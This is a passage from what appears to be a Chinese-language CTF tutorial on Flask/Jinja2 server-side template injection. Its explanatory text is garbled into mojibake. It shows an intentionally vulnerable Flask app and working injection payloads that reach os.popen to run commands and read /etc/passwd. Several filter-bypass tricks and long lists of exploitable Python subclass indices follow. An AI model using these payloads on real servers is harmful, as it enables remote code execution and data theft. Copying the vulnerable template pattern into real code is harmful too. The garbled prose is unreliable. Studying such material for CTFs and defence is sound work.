'POST'])def test(): template = ''' &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt; &lt;h3&gt;%sfrom flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route('/')def test1(): name = request.args.get('name') t = Template('''&lt;html&gt;&lt;head&gt;&lt;title&gt;Zh1z3ven&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Hello, %s !&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; '''% (name)) return t.render()if __name__ == '__main__': app.run(host='127.0.0.1', debug=True)&lt;/h3&gt; &lt;/div&gt; ''' %(request.url) return render_template_string(template) if __name__ == '__main__': app.debug = True app.run() æ¼æ´ä½¿ç”¨æ€è·¯é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨ &quot;&quot;.__class__#è¿™é‡Œçš„å¼•å·æ˜¯ä¸ºäº†å¼•å‡ºçˆ¶ç±»ä»»ä½•æ•°æ®ç»“æ„éƒ½è¡ŒåŒ…æ‹¬[]'' è·å–ç±»ï¼Œæ­¤æ—¶ä¼šè¿”å›ç±»æ˜¯strå†ä½¿ç”¨basesæˆ–è€…mroè·å–åˆ°objectåŸºç±»ï¼ˆå› ä¸ºobjectæ˜¯æ‰€æœ‰ç±»çš„åŸºï¼ˆçˆ¶ï¼‰ç±»ï¼‰ã€‚ &quot;&quot;.__class__.__bases__ æ¥ä¸‹æ¥è·å–å…¶æ‰€æœ‰å­ç±»ï¼š &quot;&quot;.__class__.__mro__[1].__subclasses__() æˆ‘ä»¬åªéœ€è¦å¯»æ‰¾å¯èƒ½æ‰§è¡Œå‘½ä»¤æˆ–è€…å¯ä»¥è¯»å–æ–‡ä»¶çš„ç±»å°±å¯ä»¥äº†ï¼Œé‡ç‚¹å…³æ³¨os/fileè¿™äº›å…³é”®å­—ã€‚ è·å–åˆ°subclassesåï¼Œåˆæ­¥çœ‹äº†ä¸€ä¸‹æ²¡æœ‰èƒ½ç›´æ¥æ‰§è¡Œå‘½ä»¤æˆ–è€…è·å–æ–‡ä»¶å†…å®¹çš„ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨init.globalsæ¥çœ‹çœ‹æœ‰æ²¡æœ‰os moduleæˆ–è€…å…¶ä»–çš„å¯ä»¥è¯»å†™æ–‡ä»¶çš„ã€‚ {{&quot;&quot;.__class__.__mro__[1].__subclasses__()[303].__init__.__globals__}}#æ­¤æ—¶æ›´æ¢ä¸ºèŠ±æ‹¬å· å› ä¸ºæ˜¯è¦æ‰§è¡Œå‘½ä»¤äº†ï¼Œè€Œè¿™ä¸ª303æ˜¯é€šè¿‡çˆ†ç ´å¾—åˆ°çš„ï¼Œçˆ†ç ´åˆ°å…·æœ‰osæ¨¡å—ï¼ŒOSæ¨¡å—æ˜¯Pythonæ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªç”¨äºè®¿é—®æ“ä½œç³»ç»ŸåŠŸèƒ½çš„æ¨¡å— æœ€ç»ˆpayloadï¼š {{&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()}}//æ­¤æ—¶å°±ä¼šå›æ˜¾ç”¨æˆ·å CTFä¸­çš„bypassæµ‹è¯•æˆ‘ä»¬å¦‚æœæƒ³çŸ¥é“è¿‡æ»¤äº†ä»€ä¹ˆçš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥åœ¨ {{}} ä¸­æµ‹è¯•æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ï¼Œçœ‹çœ‹ç½‘é¡µä¼šä¸ä¼šå›æ˜¾ è¿‡æ»¤å¼•å·å¯ä»¥ä½¿ç”¨[]ï¼Œâ€™â€™ä»£æ›¿ç¬¬ä¸€ä¸ªåŒå¼•å·ç¬¬äºŒä¸ªåŒå¼•å·çš„ä½œç”¨:è·å–å­—å…¸å†…å¯¹åº”ç´¢å¼•çš„valueè¿™é‡Œä»‹ç»ä¸€ç§æŸ¥çœ‹æ–¹æ³•,åœ¨pythonä¸­ä½¿ç”¨type(å†…å®¹)ï¼Œå¯ä»¥æŸ¥è¯¢å†…å®¹çš„ç±»æ€§ type(&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__) æ­¤æ—¶æˆ‘ä»¬å¯ä»¥çŸ¥é“ ï¼š åé¢çš„æ•°æ®ç±»å‹éœ€è¦çš„æ˜¯dictè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨request.argsæ¥ç»•è¿‡æ­¤å¤„å¼•å·çš„è¿‡æ»¤ã€‚ request.argsæ˜¯flaskä¸­ä¸€ä¸ªå­˜å‚¨ç€è¯·æ±‚å‚æ•°ä»¥åŠå…¶å€¼çš„å­—å…¸ï¼Œä½¿ç”¨æ–¹æ³•: {{[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[request.args.arg1]}}&amp;arg1=os æ­¤æ—¶å³å¯ç»•è¿‡åé¢åŒå¼•å·çš„è¿‡æ»¤è¿™é‡Œè¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼šè¿˜æœ‰å¦å¤–ä¸€ç§ç»•è¿‡å¼•å·çš„åŠæ³•ï¼Œå³é€šè¿‡pythonè‡ªå¸¦å‡½æ•°æ¥ç»•è¿‡å¼•å·ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯chr()ã€‚ {{().__class__.__bases__[0].__subclasses__()[Â§0Â§].__init__.__globals__.__builtins__.chr}} çˆ†ç ´subclassesä¸­chr()å‡½æ•°åœ¨å“ª {%set+chr=[].__class__.__bases__[0].__subclasses__()[77].__init__.__globals__.__builtins__.chr%}{{[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[chr(111)%2bchr(115)][chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(108)%2bchr(115)).read()}} ä¸ºä»€ä¹ˆè¦è¿™æ ·æ„é€ ï¼Ÿ: {% ... %} for Statements ,å¯ä»¥å®ç°for,ifç­‰è¯­å¥,è¿˜æ”¯æŒsetè¯­æ³•,å¯ä»¥ç»™å˜é‡èµ‹å€¼ {%set chr=[].__class__.__bases__[0].__subclasses__()[77].__init__.__globals__.__builtins__.chr%} å…ˆè·å–chrå‡½æ•°ï¼Œèµ‹å€¼ç»™chrï¼Œæ­¤æ—¶chrå°±æ‹¥æœ‰chrå‡½æ•°çš„åŠŸèƒ½äº†ï¼Œç„¶åæ¥ä¸‹æ¥åœ¨åé¢æ‹¼æ¥éœ€è¦ä½¿ç”¨chrè¿›è¡Œç»•è¿‡çš„å­—ç¬¦ï¼Œå¦‚â€â€ è¿‡æ»¤ä¸­æ‹¬å·å›çœ‹æœ€åˆçš„payloadï¼Œè¿‡æ»¤ä¸­æ‹¬å·å¯¹æˆ‘ä»¬å½±å“æœ€å¤§çš„æ˜¯ä»€ä¹ˆï¼Œå‰è¾¹ä¸¤ä¸ªä¸­æ‹¬å·éƒ½æ˜¯ä¸ºäº†ä»æ•°ç»„ä¸­å–å€¼ï¼Œè€Œåç»­çš„ä¸­æ‹¬å·å®é™…æ˜¯ä¸å¿…è¦çš„ï¼Œglobals[â€œosâ€]å¯ä»¥æ›¿æ¢ä¸ºglobals.osã€‚ æ‰€ä»¥è¿‡æ»¤äº†ä¸­æ‹¬å·å®é™…ä¸Šå½±å“æˆ‘ä»¬çš„åªæœ‰ä»æ•°ç»„ä¸­å–å€¼ï¼Œç„¶è€Œä»æ•°ç»„ä¸­å–å€¼ï¼Œè€Œä»æ•°ç»„ä¸­å–å€¼å¯ä»¥ä½¿ç”¨pop/getitemç­‰æ•°ç»„è‡ªå¸¦æ–¹æ³•ã€‚ ä¸è¿‡è¿˜æ˜¯å»ºè®®ç”¨getitemï¼Œå› ä¸ºpopä¼šç ´åæ•°ç»„çš„ç»“æ„ã€‚ a[0]ä¸a.getitem(0)çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ä¸Šè¿°payloadå¯ä»¥ç”¨æ­¤æ¥ç»•è¿‡ï¼š {{&quot;&quot;.__class__.__mro__.__getitem__(1).__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()}} è¿‡æ»¤å…³é”®å­—å¦‚æœæ²¡ç”¨è¿‡æ»¤å¼•å·,ä½¿ç”¨åè½¬,æˆ–è€…å„ç§æ‹¼æ¥ç»•è¿‡ {{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__snitliub__'[::-1]]['eval']('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()')}}{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__buil'+'tins__'[::-1]]['eval']('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()')}} ç¬¬äºŒç§ç»•è¿‡è¿‡æ»¤å…³é”®å­—çš„åŠæ³•å³ä½¿ç”¨requestå¯¹è±¡ï¼šflaskè·å–å‚æ•°æ–¹å¼ï¼š request.form.get(â€œkeyâ€, type=str, default=None) è·å–è¡¨å•æ•°æ® request.args.get(â€œkeyâ€) è·å–getè¯·æ±‚å‚æ•° request.values.get(â€œkeyâ€) è·å–æ‰€æœ‰å‚æ•° {&quot;&quot;.__getattribute__(request.args.a)}&amp;a=__class__ ç¬¬ä¸‰ç§æ˜¯å¯»æ‰¾å…¶åŸç”Ÿå‡½æ•° è¿‡æ»¤ç‚¹åœ¨pythonä¸­ï¼Œå¯ç”¨ä»¥ä¸‹è¡¨ç¤ºæ³•å¯ç”¨äºè®¿é—®å¯¹è±¡çš„å±æ€§ {{().__class__}}{{()[&quot;__class__&quot;]}}{{()|attr(&quot;__class__&quot;)}}{{getattr('',&quot;__class__&quot;)}} ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡[]ï¼Œ|attr()ï¼Œgetattr()æ¥ç»•è¿‡ç‚¹ å¸¸ç”¨è¯­å¥ï¼šä»»æ„æ–‡ä»¶è¯»å–: {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %} è¯»å–åˆ°classåæ‰€æŒ‡å‘çš„å¯ä»¥è¢«ç»§æ‰¿çš„å‡½æ•°å°ç»“python3çš„75 &lt;class '_frozen_importlib._ModuleLock'&gt; __builtins__ None75 &lt;class '_frozen_importlib._ModuleLock'&gt; __import__ None75 &lt;class '_frozen_importlib._ModuleLock'&gt; sys None76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __builtins__ None76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __import__ None76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; sys None77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __builtins__ None77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __import__ None77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; sys None78 &lt;class '_frozen_importlib._installed_safely'&gt; __builtins__ None78 &lt;class '_frozen_importlib._installed_safely'&gt; __import__ None78 &lt;class '_frozen_importlib._installed_safely'&gt; sys None79 &lt;class '_frozen_importlib.ModuleSpec'&gt; __builtins__ None79 &lt;class '_frozen_importlib.ModuleSpec'&gt; __import__ None79 &lt;class '_frozen_importlib.ModuleSpec'&gt; sys None91 &lt;class '_frozen_importlib_external.FileLoader'&gt; __builtins__ None91 &lt;class '_frozen_importlib_external.FileLoader'&gt; sys None92 &lt;class '_frozen_importlib_external._NamespacePath'&gt; __builtins__ None92 &lt;class '_frozen_importlib_external._NamespacePath'&gt; sys None93 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; __builtins__ None93 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; sys None95 &lt;class '_frozen_importlib_external.FileFinder'&gt; __builtins__ None95 &lt;class '_frozen_importlib_external.FileFinder'&gt; sys None103 &lt;class 'codecs.IncrementalEncoder'&gt; __builtins__ None103 &lt;class 'codecs.IncrementalEncoder'&gt; sys None103 &lt;class 'codecs.IncrementalEncoder'&gt; open None104 &lt;class 'codecs.IncrementalDecoder'&gt; __builtins__ None104 &lt;class 'codecs.IncrementalDecoder'&gt; sys None104 &lt;class 'codecs.IncrementalDecoder'&gt; open None105 &lt;class 'codecs.StreamReaderWriter'&gt; __builtins__ None105 &lt;class 'codecs.StreamReaderWriter'&gt; sys None105 &lt;class 'codecs.StreamReaderWriter'&gt; open None106 &lt;class 'codecs.StreamRecoder'&gt; __builtins__ None106 &lt;class 'codecs.StreamRecoder'&gt; sys None106 &lt;class 'codecs.StreamRecoder'&gt; open None128 &lt;class 'os._wrap_close'&gt; __builtins__ None128 &lt;class 'os._wrap_close'&gt; sys None128 &lt;class 'os._wrap_close'&gt; open None129 &lt;class '_sitebuiltins.Quitter'&gt; __builtins__ None129 &lt;class '_sitebuiltins.Quitter'&gt; sys None130 &lt;class '_sitebuiltins._Printer'&gt; __builtins__ None130 &lt;class '_sitebuiltins._Printer'&gt; sys None137 &lt;class 'types.DynamicClassAttribute'&gt; __builtins__ None138 &lt;class 'types._GeneratorWrapper'&gt; __builtins__ None139 &lt;class 'warnings.WarningMessage'&gt; __builtins__ None139 &lt;class 'warnings.WarningMessage'&gt; sys None140 &lt;class 'warnings.catch_warnings'&gt; __builtins__ None140 &lt;class 'warnings.catch_warnings'&gt; sys None167 &lt;class 'reprlib.Repr'&gt; __builtins__ None174 &lt;class 'functools.partialmethod'&gt; __builtins__ None176 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; __builtins__ None176 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; sys None177 &lt;class 'contextlib._BaseExitStack'&gt; __builtins__ None177 &lt;class 'contextlib._BaseExitStack'&gt; sys None----------3-----------75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; exec75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; eval75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; compile75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; __import__75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; open76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; exec76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; eval76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; compile76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __import__76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; open77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; exec77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; eval77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; compile77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __import__77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; open78 5 &lt;class '_frozen_importlib._installed_safely'&gt; exec78 5 &lt;class '_frozen_importlib._installed_safely'&gt; eval78 5 &lt;class '_frozen_importlib._installed_safely'&gt; compile78 5 &lt;class '_frozen_importlib._installed_safely'&gt; __import__78 5 &lt;class '_frozen_importlib._installed_safely'&gt; open79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; exec79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; eval79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; compile79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; __import__79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; open91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; exec91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; eval91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; compile91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; __import__91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; open92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; exec92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; eval92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; compile92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; __import__92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; open93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; exec93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; eval93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; compile93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; __import__93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; open95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; exec95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; eval95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; compile95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; __import__95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; open103 7 &lt;class 'codecs.IncrementalEncoder'&gt; exec103 7 &lt;class 'codecs.IncrementalEncoder'&gt; eval103 7 &lt;class 'codecs.IncrementalEncoder'&gt; compile103 7 &lt;class 'codecs.IncrementalEncoder'&gt; __import__103 7 &lt;class 'codecs.IncrementalEncoder'&gt; open103 56 &lt;class 'codecs.IncrementalEncoder'&gt; open104 7 &lt;class 'codecs.IncrementalDecoder'&gt; exec104 7 &lt;class 'codecs.IncrementalDecoder'&gt; eval104 7 &lt;class 'codecs.IncrementalDecoder'&gt; compile104 7 &lt;class 'codecs.IncrementalDecoder'&gt; __import__104 7 &lt;class 'codecs.IncrementalDecoder'&gt; open104 56 &lt;class 'codecs.IncrementalDecoder'&gt; open105 7 &lt;class 'codecs.StreamReaderWriter'&gt; exec105 7 &lt;class 'codecs.StreamReaderWriter'&gt; eval105 7 &lt;class 'codecs.StreamReaderWriter'&gt; compile105 7 &lt;class 'codecs.StreamReaderWriter'&gt; __import__105 7 &lt;class 'codecs.StreamReaderWriter'&gt; open105 56 &lt;class 'codecs.StreamReaderWriter'&gt; open106 7 &lt;class 'codecs.StreamRecoder'&gt; exec106 7 &lt;class 'codecs.StreamRecoder'&gt; eval106 7 &lt;class 'codecs.StreamRecoder'&gt; compile106 7 &lt;class 'codecs.StreamRecoder'&gt; __import__106 7 &lt;class 'codecs.StreamRecoder'&gt; open106 56 &lt;class 'codecs.StreamRecoder'&gt; open128 1 &lt;class 'os._wrap_close'&gt; exec128 1 &lt;class 'os._wrap_close'&gt; file128 1 &lt;class 'os._wrap_close'&gt; open128 7 &lt;class 'os._wrap_close'&gt; exec128 7 &lt;class 'os._wrap_close'&gt; eval128 7 &lt;class 'os._wrap_close'&gt; compile128 7 &lt;class 'os._wrap_close'&gt; __import__128 7 &lt;class 'os._wrap_close'&gt; open128 11 &lt;class 'os._wrap_close'&gt; open129 7 &lt;class '_sitebuiltins.Quitter'&gt; exec129 7 &lt;class '_sitebuiltins.Quitter'&gt; eval129 7 &lt;class '_sitebuiltins.Quitter'&gt; compile129 7 &lt;class '_sitebuiltins.Quitter'&gt; __import__129 7 &lt;class '_sitebuiltins.Quitter'&gt; open130 7 &lt;class '_sitebuiltins._Printer'&gt; exec130 7 &lt;class '_sitebuiltins._Printer'&gt; eval130 7 &lt;class '_sitebuiltins._Printer'&gt; compile130 7 &lt;class '_sitebuiltins._Printer'&gt; __import__130 7 &lt;class '_sitebuiltins._Printer'&gt; open137 7 &lt;class 'types.DynamicClassAttribute'&gt; exec137 7 &lt;class 'types.DynamicClassAttribute'&gt; eval137 7 &lt;class 'types.DynamicClassAttribute'&gt; compile137 7 &lt;class 'types.DynamicClassAttribute'&gt; __import__137 7 &lt;class 'types.DynamicClassAttribute'&gt; open138 7 &lt;class 'types._GeneratorWrapper'&gt; exec138 7 &lt;class 'types._GeneratorWrapper'&gt; eval138 7 &lt;class 'types._GeneratorWrapper'&gt; compile138 7 &lt;class 'types._GeneratorWrapper'&gt; __import__138 7 &lt;class 'types._GeneratorWrapper'&gt; open139 7 &lt;class 'warnings.WarningMessage'&gt; exec139 7 &lt;class 'warnings.WarningMessage'&gt; eval139 7 &lt;class 'warnings.WarningMessage'&gt; compile139 7 &lt;class 'warnings.WarningMessage'&gt; __import__139 7 &lt;class 'warnings.WarningMessage'&gt; open140 7 &lt;class 'warnings.catch_warnings'&gt; exec140 7 &lt;class 'warnings.catch_warnings'&gt; eval140 7 &lt;class 'warnings.catch_warnings'&gt; compile140 7 &lt;class 'warnings.catch_warnings'&gt; __import__140 7 &lt;class 'warnings.catch_warnings'&gt; open167 7 &lt;class 'reprlib.Repr'&gt; exec167 7 &lt;class 'reprlib.Repr'&gt; eval167 7 &lt;class 'reprlib.Repr'&gt; compile167 7 &lt;class 'reprlib.Repr'&gt; __import__167 7 &lt;class 'reprlib.Repr'&gt; open174 7 &lt;class 'functools.partialmethod'&gt; exec174 7 &lt;class 'functools.partialmethod'&gt; eval174 7 &lt;class 'functools.partialmethod'&gt; compile174 7 &lt;class 'functools.partialmethod'&gt; __import__174 7 &lt;class 'functools.partialmethod'&gt; open176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; exec176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; eval176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; compile176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; __import__176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; open177 7 &lt;class 'contextlib._BaseExitStack'&gt; exec177 7 &lt;class 'contextlib._BaseExitStack'&gt; eval177 7 &lt;class 'contextlib._BaseExitStack'&gt; compile177 7 &lt;class 'contextlib._BaseExitStack'&gt; __import__177 7 &lt;class 'contextlib._BaseExitStack'&gt; open----------4-----------140 exec140 eval140 compile140 __import__140 openç­›é€‰å‡ºæ¥çš„æ¨¡å—è¿˜æ˜¯å¾ˆå¤šï¼Œæ¯ä¸ªåˆ†å—ä¸­ï¼Œä¸ç”¨çš„éƒ¨åˆ†ä»£è¡¨åˆ©ç”¨ä¸åŒçš„æ–¹å¼ï¼Œä¸ºäº†æ›´æ–¹ä¾¿çš„åˆ©ç”¨è¿›ä¸€æ­¥ç­›é€‰å…·æœ‰æ›´ç›´æ¥åˆ©ç”¨æ–¹å¼çš„ç±»ï¼Œå…³æ³¨å†å‘½ä»¤æ‰§è¡Œå’Œè¯»å†™ä¸Š----------2----------- 103 &lt;class 'codecs.IncrementalEncoder'&gt; open None 104 &lt;class 'codecs.IncrementalDecoder'&gt; open None 105 &lt;class 'codecs.StreamReaderWriter'&gt; open None 106 &lt;class 'codecs.StreamRecoder'&gt; open None 128 &lt;class 'os._wrap_close'&gt; open None ----------3----------- 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; open 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; exec 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; open 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; exec 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; open 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; exec 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; open 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; exec 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; open 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; exec 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; open 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; exec 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; open92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; exec93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; open93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; exec95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; open 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; exec 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; open 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; exec 103 56 &lt;class 'codecs.IncrementalEncoder'&gt; open 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; open 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; exec 104 56 &lt;class 'codecs.IncrementalDecoder'&gt; open 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; open 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; exec 105 56 &lt;class 'codecs.StreamReaderWriter'&gt; open 106 7 &lt;class 'codecs.StreamRecoder'&gt; open 106 7 &lt;class 'codecs.StreamRecoder'&gt; exec 106 56 &lt;class 'codecs.StreamRecoder'&gt; open 128 1 &lt;class 'os._wrap_close'&gt; open 128 1 &lt;class 'os._wrap_close'&gt; exec 128 7 &lt;class 'os._wrap_close'&gt; open 128 7 &lt;class 'os._wrap_close'&gt; exec 128 11 &lt;class 'os._wrap_close'&gt; open 129 7 &lt;class '_sitebuiltins.Quitter'&gt; open 129 7 &lt;class '_sitebuiltins.Quitter'&gt; exec 130 7 &lt;class '_sitebuiltins._Printer'&gt; open 130 7 &lt;class '_sitebuiltins._Printer'&gt; exec 137 7 &lt;class 'types.DynamicClassAttribute'&gt; open 137 7 &lt;class 'types.DynamicClassAttribute'&gt; exec 138 7 &lt;class 'types._GeneratorWrapper'&gt; open 138 7 &lt;class 'types._GeneratorWrapper'&gt; exec 139 7 &lt;class 'warnings.WarningMessage'&gt; open 139 7 &lt;class 'warnings.WarningMessage'&gt; exec 140 7 &lt;class 'warnings.catch_warnings'&gt; open 140 7 &lt;class 'warnings.catch_warnings'&gt; exec 167 7 &lt;class 'reprlib.Repr'&gt; open 167 7 &lt;class 'reprlib.Repr'&gt; exec 174 7 &lt;class 'functools.partialmethod'&gt; open 174 7 &lt;class 'functools.partialmethod'&gt; exec 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; open176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; exec177 7 &lt;class 'contextlib._BaseExitStack'&gt; open 177 7 &lt;class 'contextlib._BaseExitStack'&gt; exec ----------4----------- 140 open 140 exec python2----------1-----------(40, 'file')----------2-----------(59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__'])(59, &lt;class 'warnings.WarningMessage'&gt;, '__builtins__', None)(59, &lt;class 'warnings.WarningMessage'&gt;, 'sys', None)(59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__'])(60, &lt;class 'warnings.catch_warnings'&gt;, 'linecache', ['os', 'sys', '__builtins__'])(60, &lt;class 'warnings.catch_warnings'&gt;, '__builtins__', None)(60, &lt;class 'warnings.catch_warnings'&gt;, 'sys', None)(60, &lt;class 'warnings.catch_warnings'&gt;, 'types', ['__builtins__'])(61, &lt;class '_weakrefset._IterationGuard'&gt;, '__builtins__', None)(62, &lt;class '_weakrefset.WeakSet'&gt;, '__builtins__', None)(72, &lt;class 'site._Printer'&gt;, '__builtins__', None)(72, &lt;class 'site._Printer'&gt;, 'traceback', ['sys', '__builtins__'])(72, &lt;class 'site._Printer'&gt;, 'os', ['sys', '__builtins__', 'open'])(72, &lt;class 'site._Printer'&gt;, 'sys', None)(77, &lt;class 'site.Quitter'&gt;, '__builtins__', None)(77, &lt;class 'site.Quitter'&gt;, 'traceback', ['sys', '__builtins__'])(77, &lt;class 'site.Quitter'&gt;, 'os', ['sys', '__builtins__', 'open'])(77, &lt;class 'site.Quitter'&gt;, 'sys', None)(78, &lt;class 'codecs.IncrementalEncoder'&gt;, '__builtins__', None)(78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'sys', None)(78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open', None)(79, &lt;class 'codecs.IncrementalDecoder'&gt;, '__builtins__', None)(79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'sys', None)(79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open', None)----------3-----------(59, 13, &lt;class 'warnings.WarningMessage'&gt;, '__import__')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'compile')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile')(60, 13, &lt;class 'warnings.catch_warnings'&gt;, '__import__')(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'file')(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'compile')(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'eval')(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'open')(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'execfile')(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, '__import__')(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'file')(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'compile')(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'eval')(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'open')(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'execfile')(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, '__import__')(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'file')(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'compile')(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'eval')(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'open')(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'execfile')(72, 20, &lt;class 'site._Printer'&gt;, 'file')(72, 20, &lt;class 'site._Printer'&gt;, 'exec')(72, 23, &lt;class 'site._Printer'&gt;, '__import__')(72, 23, &lt;class 'site._Printer'&gt;, 'file')(72, 23, &lt;class 'site._Printer'&gt;, 'compile')(72, 23, &lt;class 'site._Printer'&gt;, 'eval')(72, 23, &lt;class 'site._Printer'&gt;, 'open')(72, 23, 